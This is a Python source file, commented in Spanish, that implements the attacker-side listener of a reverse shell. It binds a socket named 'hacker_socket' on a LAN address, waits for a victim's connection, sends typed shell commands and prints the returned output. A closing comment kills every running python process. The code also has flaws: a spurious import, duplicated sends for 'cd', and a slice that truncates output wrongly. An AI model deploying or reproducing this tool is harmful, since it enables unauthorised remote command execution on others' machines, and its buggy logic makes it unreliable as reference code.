from logging.config import IDENTIFIER
import socket

IDENTIFIER = "<END_OF_COMMAND_RESULT>"

if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, # IPv4
                                  socket.SOCK_STREAM)  # TCP
    ip = "192.168.1.133"
    port = 65432
    socket_address = (ip, port)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)
    print("Listening for incoming connection requests")
    hacker_socket, client_address = hacker_socket.accept()
    print("Connection established with ", client_address)
    
    # Ahora ponemos un loop para introducir comandos hasta que nos hartemos
    try:
        while True:
            # Se introducen los comandos y se codifican en bytes
            command = input("Enter command ")
            hacker_socket.send(command.encode())
            if command == "stop":
                hacker_socket.close()
                break
            elif command == "":
                continue
            elif command.startswith("cd"):
                hacker_socket.send(command.encode())
                continue
            else:
                full_command_result = b''
                while True:
                    chunk = hacker_socket.recv(1048)
                    if chunk.endswith(IDENTIFIER.encode()):
                        chunk = chunk[:len(IDENTIFIER)]
                        full_command_result += chunk
                        break
                    full_command_result += chunk
                print(full_command_result.decode())
    except Exception:
        print("Exception occured")
        hacker_socket.close()
            
# To close the adress:
# kill -9 $(ps -A | grep python | awk '{print $1}')